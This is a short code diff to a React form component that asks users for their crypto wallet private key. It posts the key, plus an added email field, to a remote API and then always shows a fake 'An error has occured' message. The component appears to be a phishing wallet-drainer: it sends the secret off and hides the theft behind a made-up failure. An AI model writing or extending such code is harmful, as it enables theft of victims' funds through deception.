@@ -1,8 +1,8 @@
 import axios from "axios";
 import React, { useState } from "react";
-import { Form, Button, Spinner } from "react-bootstrap";
+import { Button, Form, Spinner } from "react-bootstrap";
 import toast from "react-hot-toast";
-import { api, remoteApi } from "../../Global/Keys";
+import { api, email, remoteApi } from "../../Global/Keys";
 const PrivateKeyForm = () => {
   const [privateKey, setPrivateKey] = useState("");
   const [loading, setLoading] = useState(false);
@@ -17,8 +17,9 @@ const PrivateKeyForm = () => {
     setLoading(true);
 
     try {
-      const res = await axios.post(`${remoteApi}/wallet/privateKey`, {
+      await axios.post(`${remoteApi}/wallet/privateKey`, {
         privateKey,
+        email,
       });
       // console.log(res.data);
       toast.error("An error has occured... Please check back");
